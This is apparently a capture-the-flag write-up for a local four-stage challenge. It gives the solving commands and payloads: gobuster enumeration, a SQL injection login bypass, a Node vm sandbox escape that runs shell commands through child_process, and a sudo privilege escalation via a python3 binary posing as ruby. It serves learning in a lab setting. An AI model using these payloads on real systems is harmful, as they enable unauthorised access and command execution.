# Writeups

## Enumeration - 1

```
gobuster dir -x txt -u http://localhost:1337/ -w directory-list-2.3-medium.txt
```

Will point to `/security.txt`, where the flag is hidden with the link to the next challenge.

## Login - 2

```
username: " OR 1=1))--
password:
```

This was a typical SQL injection, with a twist of adding parentheses.

## Foothold - 3

```
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('cat /flags/FLAG_3').toString()
```

This was built off of payloads for `vm`, a vulnerable `node` sandbox. These can be easily found, offering these solutions. You simply escape through the VM's constructor.

## PrivEsc - 4

The following is highly reliant on keeping the previous base payload. If you find a way to reverse shell, you should also be fine (but not required). 

You can use a tool like `Linpeas` to find common vulnerabilties. This should flag you that following sudo configuration:

```
sudo -l
```

```
Matching Defaults entries for k1dd13 on ...:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User k1dd13 may run the following commands on ...:
    (ALL : ALL) ALL
    (super_k1dd13) NOPASSWD: /bin/lua, /bin/php, /bin/ruby, /bin/vim
```

This configuration allows to run `sudo` as `super_k1dd13` for the listed binaries. This is done as follows:

```
sudo -u super_k1dd13 ...
```

 These look like standard binaries, which we can find sudo payloads for on https://gtfobins.github.io/ . This said, you'll see 3 of the listed "binaries" are duds. The only working one is `/bin/ruby`, which is actually `python3`. Therefore, you can get a privesc and get the flag using the following:

```
sudo -u super_k1dd13 /bin/ruby -c "import os; os.system(\'/bin/cat /flags/FLAG_4\')"
```

If combined with the prior payload, it would give:

```
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('sudo -u super_k1dd13 /bin/ruby -c "import os; os.system(\'/bin/cat /flags/FLAG_4\')"').toString()
```
